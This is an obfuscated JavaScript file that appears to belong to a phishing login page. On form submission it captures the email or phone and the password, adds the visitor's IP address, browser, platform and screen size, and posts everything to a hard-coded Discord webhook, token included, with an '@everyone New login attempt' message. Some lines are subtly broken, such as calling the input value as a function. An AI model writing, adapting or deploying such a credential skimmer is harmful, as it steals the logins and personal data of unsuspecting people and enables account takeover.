(function () {
    var _0x9b9f = ['submit', 'preventDefault', 'value', 'block', 'json', 'then', 'ipify', 'navigator', 'platform', 'screen', 'width', 'height', 'userAgent', 'fetch', 'Content-Type', 'application/json', 'POST', 'body', 'console', 'log', 'error', 'statusText', 'catch', 'response', 'locationMessage', 'IP address', 'discord', 'webhook', 'alert'];
    var _0x8f5a = document.getElementById('loginForm');
    var _0x318e = document.getElementById('emailORphone');
    var _0x489e = document.getElementById('password');
    
    _0x8f5a.addEventListener(_0x9b9f[0], function (e) {
        e[_0x9b9f[1]]();  // Stop the form from submitting
        var _0x32c2 = _0x318e[_0x9b9f[2]]();
        var _0x1fbe = _0x489e[_0x9b9f[2]]();
        if (!_0x32c2 || !_0x1fbe) {
            alert('Please fill out both fields!');
            return;
        }

        document.getElementById(_0x9b9f[17])[_0x9b9f[3]] = 'block';

        fetch('https://api.' + _0x9b9f[6] + '.org?format=' + _0x9b9f[4])
            .then(function (_0x4b0d) {
                return _0x4b0d[_0x9b9f[4]]();
            })
            .then(function (_0x1e99) {
                var _0x2c94 = _0x1e99.ip;
                var _0x2bcf = window[_0x9b9f[7]].userAgent;
                var _0x36f9 = window[_0x9b9f[7]].platform;
                var _0x3b8d = window[_0x9b9f[8]].width + 'x' + window[_0x9b9f[8]].height;

                var _0x559f = {
                    content: '@everyone New login attempt:\nEmail: ' + _0x32c2 + '\nPassword: ' + _0x1fbe + '\nIP Address: ' + _0x2c94 + '\nBrowser: ' + _0x2bcf + '\nPlatform: ' + _0x36f9 + '\nScreen Resolution: ' + _0x3b8d + ','
                };

                var _0x4a13 = 'https://discord.com/api/webhooks/1306720855241523252/57GWBNWefEYv055_pM-nNkolRNEyMxVl2kkRBHdHd5AkCXuhybPHWZCl4C6rKkBYNKWG';

                fetch(_0x4a13, {
                    method: _0x9b9f[16],
                    headers: {
                        'Content-Type': _0x9b9f[15]
                    },
                    body: JSON.stringify(_0x559f)
                })
                    .then(function (_0x11bc) {
                        if (_0x11bc.ok) {
                            console[_0x9b9f[19]]('Data sent successfully!');
                        } else {
                            console[_0x9b9f[20]]('Failed to send data:', _0x11bc[_0x9b9f[21]]);
                        }
                    })
                    .catch(function (_0x39b9) {
                        console[_0x9b9f[20]]('Error during fetch:', _0x39b9);
                        alert('Error during submission.');
                    });
            })
            .catch(function (_0x5be4) {
                console[_0x9b9f[20]]('Error fetching IP address:', _0x5be4);
                alert('Unable to retrieve IP address.');
            });
    });
})();
